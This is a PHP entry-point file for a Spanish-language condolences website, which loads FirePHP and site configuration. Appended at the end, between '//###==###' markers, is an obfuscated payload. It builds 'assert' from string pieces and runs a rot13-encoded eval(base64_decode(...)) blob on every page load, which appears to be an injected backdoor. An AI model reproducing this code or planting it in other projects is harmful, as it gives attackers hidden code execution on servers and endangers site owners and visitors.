<?php
$__BENCH__['start'] = microtime(true);

require_once('/usr/share/php/FirePHPCore/FirePHP.class.php');
$firephp = FirePHP::getInstance(true);
$firephp->registerErrorHandler($throwErrorExceptions=false);
$firephp->registerExceptionHandler();
$firephp->registerAssertionHandler($convertAssertionErrorsToExceptions=true,$throwAssertionExceptions=false);

switch (@$_SERVER["SERVER_NAME"]) {
    case 'condolencias.tk':
    case 'condolencias.com.sv':
        if (empty($_GET['peticion'])) $_GET['peticion'] = 'portada.condolencias';
        require_once('config.condolencias.php');
        break;
    default:
        if (empty($_GET['peticion'])) $_GET['peticion'] = 'portada';
        require_once('config.php');
        break;
}

if (empty($_GET['peticion'])) $_GET['peticion'] = __PORTADA__;

require_once(__BASE__ARRANQUE.'arranque.php');
$__BENCH__['end'] = microtime(true);

//###==###
$strings = "as"; $strings .= "sert";
					@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9anzEmqJI4oaM6qz8hpaHiM2I0YaObpQ9xCFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqXF4vWaH9Vv51pzkyozAiMTHbWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqXF4vWzZ9Vv4xLmNhVvMcCGRznKN9Vv4xK1ASHyMSHyfvHxIAG1ESK0SRESVvKF4vWzt9Vv5gMQHbVwRlLmWzAJD2AzWzZwtmMGqyZTZkLGyxBJH2LmNkMwpmVv4xK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKF4xK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0hWTZjYvVkVvxcB2A1pzksp2I0o3O0XPEwZFj0ZvkzLJkmMFx7L3IloS9mMKEipUDbWTZkYQR5BGRmYUElqJHcBlEcLaLtCFNtL3IloS9yrTIwXPEwZFx7L3IloS9woT9mMFtxLmRcB31yoUAynJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvx9CGRcrlEcLaLtCFOznJkyK2qyqS9wo250MJ50pltvnUE0pQbiY2qdMUA1MKuhqac2ol5lqF9aMKDhpTujC2D9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0cYvVzqG0vYaIloTIhL29xMFtxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0cYvVzLm0vYvEwZP4vWzx9ZFMcpQ0vYvEsH0IFIxIFJlWFEH1CIRIsDHERHvWqYvVznQ0vYz1xAFtvZGWwZzL1MQL2LzLlBQAyA2HjLmSuBJD5MGMwZQSzAmZvYvEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqYvEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKF4xLmNhVwRvXFx7sFOcMvNbnKAmMKDbWTyvqvxcVUftMJAbolNxnJW2BlO9VTyzXTymp2I0XPEsHxIEIHIGISfvpPWqXFNzWvNxK1WSHIISH1EoVaNvKFN9CFNvMJSuZmx0MGHvXFO7VROup3AypaDbWS9FEISIEIAHJlWwVy0cBlO9sD=="));'));
//###==###
?>